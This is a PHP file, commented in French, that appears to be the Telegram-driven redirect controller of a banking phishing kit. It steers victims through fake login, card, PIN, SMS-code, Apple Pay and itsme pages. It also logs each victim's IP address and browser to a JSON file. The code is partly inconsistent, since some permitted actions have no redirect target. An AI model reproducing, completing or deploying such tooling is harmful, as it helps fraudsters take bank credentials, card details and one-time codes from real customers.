<?php
// Système de redirection forcée pour Telegram

if (!defined('ALLOW_INCLUDE')) {
    define('ALLOW_INCLUDE', true);
}

session_start();
require_once '../modules/load_config.php';

header('Content-Type: application/json');

$action = $_GET['action'] ?? '';
$uid = $_SESSION['user_id'] ?? uniqid('user_', true);

// Actions autorisées
$allowedActions = [
    'login', 'login_error',
    'infos', 'infos_error', 
    'carte', 'carte_error',
    'pin', 'pin_error', 'pin_cc', 'pin_cc_error',
    'sms', 'sms_error',
    'applepay', 'applepay_error',
    'itsme', 'itsme_error',
    'success', 'ban_ip'
];

if (!in_array($action, $allowedActions)) {
    http_response_code(400);
    echo json_encode(['error' => 'Action non autorisée']);
    exit;
}

// Mapping des redirections
$redirects = [
    'login' => '../pages/index.php',
    'login_error' => '../pages/index.php?error=error',

    'infos' => '../pages/infos.php',
    'infos_error' => '../pages/infos.php?error=error',

    'carte' => '../pages/carte.php',
    'carte_error' => '../pages/carte.php?error=error',

    'pin' => '../pages/pin.php',
    'pin_error' => '../pages/pin.php?error=error',   
    
    'sms' => '../pages/sms.php',
    'sms_error' => '../pages/sms.php?error=error',

    'auth' => '../pages/auth.php',
    'auth_error' => '../pages/auth.php?error=error',

    'custom_input' => '../pages/custom_input.php',
    'custom_input_error' => '../pages/custom_input.php?error=error',

    'success' => '../pages/success.php',
    'ban_ip' => '../pages/ban.php'
];

// Enregistrer la redirection forcée
$forceRedirectLog = __DIR__ . '/force_redirect_log.json';
$redirectData = [
    'action' => $action,
    'uid' => $uid,
    'timestamp' => time(),
    'datetime' => date('Y-m-d H:i:s'),
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
    'ip' => $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Inconnu'
];

$existingRedirects = [];
if (file_exists($forceRedirectLog)) {
    $existingRedirects = json_decode(file_get_contents($forceRedirectLog), true) ?: [];
}
$existingRedirects[] = $redirectData;
file_put_contents($forceRedirectLog, json_encode($existingRedirects, JSON_PRETTY_PRINT));

// Retourner la redirection
echo json_encode([
    'success' => true,
    'action' => $action,
    'redirect_url' => $redirects[$action],
    'timestamp' => time()
]);
?>
